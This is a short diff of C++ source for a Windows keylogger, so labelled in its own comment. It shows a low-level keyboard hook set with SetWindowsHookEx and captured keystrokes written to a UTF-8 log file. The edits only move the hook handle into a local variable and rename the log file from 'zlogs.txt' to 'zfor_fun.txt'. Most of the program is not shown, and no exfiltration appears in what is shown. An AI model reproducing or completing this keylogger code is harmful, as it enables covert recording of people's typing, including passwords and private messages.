@@ -1,5 +1,5 @@
-
 // unicode keylogger
+
 #include <iostream>
 #include <windows.h>
 #include <fstream>
@@ -11,7 +11,7 @@
 using namespace std;
 #define MAX_LENGTH 1000
 
-HHOOK hKeyboardHook;
+
 wchar_t buf[MAX_LENGTH];
 int count_char = 0;
 wchar_t uni_buf[200];
@@ -20,7 +20,7 @@ wstring pre_app_name = L" ";
 
 void save_in_file(wchar_t str[])
 {
-    wofstream  fileS{ "D:\\zlogs.txt",ios_base::app };//open file
+    wofstream  fileS{ "D:\\zfor_fun.txt",ios_base::app };//open file
     locale loc(locale(), new codecvt_utf8<wchar_t>);//define utf8
     fileS.imbue(loc);//set utf_8 to output stream of file
 
@@ -289,7 +289,7 @@ void MessageLoop()
 
 DWORD WINAPI my_HotKey()
 {
-    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyboardEvent, NULL, NULL);
+    HHOOK hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyboardEvent, NULL, NULL);
     MessageLoop();
     UnhookWindowsHookEx(hKeyboardHook);
     return 0;
